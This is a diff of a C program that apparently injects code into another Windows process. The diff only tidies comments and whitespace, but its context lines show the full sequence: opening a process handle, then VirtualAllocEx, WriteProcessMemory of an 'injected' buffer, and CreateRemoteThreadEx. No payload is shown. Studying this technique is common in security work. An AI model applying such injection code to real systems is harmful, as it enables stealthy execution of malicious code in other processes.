@@ -32,7 +32,7 @@ int main(int argc, char **argv) {
 	printf("%s trying to open a handle to process (%ld)\n", i, (unsigned long)PID);
 
 	/* open handle to the process */
-	/* from https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess 
+	/* from https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
     HANDLE OpenProcess(
         [in] DWORD dwDesiredAccess,
         [in] BOOL  bInheritHandle,
@@ -47,7 +47,8 @@ int main(int argc, char **argv) {
 		return EXIT_FAILURE;
 	}
 
-	/* allocate bytes to process memory
+	/* allocate bytes to process memory */
+	/*
     LPVOID VirtualAllocEx(
         [in]           HANDLE hProcess,
         [in, optional] LPVOID lpAddress,
@@ -68,7 +69,7 @@ int main(int argc, char **argv) {
         [in]  SIZE_T  nSize,
         [out] SIZE_T  *lpNumberOfBytesWritten
     );
-*/
+	*/
 	WriteProcessMemory(hProcess, rBuffer, injected, sizeof(injected), NULL);
 	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(injected));
 
@@ -84,7 +85,7 @@ int main(int argc, char **argv) {
         [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
         [out, optional] LPDWORD                      lpThreadId
     );
-*/
+	*/
 	hThread = CreateRemoteThreadEx(
 		hProcess,
 		NULL,
@@ -110,3 +111,4 @@ int main(int argc, char **argv) {
 
 	return EXIT_SUCCESS;
 }
+
